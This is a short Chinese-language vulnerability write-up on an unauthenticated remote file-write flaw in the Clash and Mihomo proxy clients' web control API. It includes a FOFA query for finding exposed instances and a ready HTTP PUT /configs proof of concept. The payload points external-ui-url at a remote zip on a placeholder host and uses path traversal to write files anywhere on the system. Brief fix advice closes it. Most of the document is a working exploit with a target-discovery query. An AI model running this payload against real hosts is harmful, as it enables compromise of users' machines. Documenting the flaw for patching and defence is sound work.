# Mihomo-RCE
Clash多版本存在该漏洞，如：Clash Verge。
漏洞版本：Clash ≤2.2.4 , Mihomo ≤v1.19.8


Clash的Web控制服务，默认开启的（默认端口为9090/9097）且默认空秘钥，且所有历史版本（Clash ≤2.2.4 , Mihomo ≤v1.19.8）都受此漏洞影响。

FOFA查询：body="\"hello\":\"mihomo\"" || body="\"hello\":\"clash\""

* POC
```
PUT /configs HTTP/1.1
Host: 127.0.0.1:9097
Connection: keep-alive
Content-Length: 196
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Content-Type: text/plain;charset=UTF-8

{"payload":"\n  external-ui: gY1bN0iF0kG2eN4z\n  external-ui-url: http://www.demo.com/demo.zip\n                external-ui-name: demo","path":""}
```
external-ui-url位置的远程文件http://www.demo.com/demo.zip可路径穿越，通过external-ui: ../../../tmp的方式，突破目录限制，实现任意文件写入。


*【安全修复建议】
1、将Clash客户端和Mihomo升级至已修复版本：
Clash>= v2.3.0
Mihomo >= v1.20.1
2、关闭不必要的服务端口
3、外部监听地址增加秘钥限制。
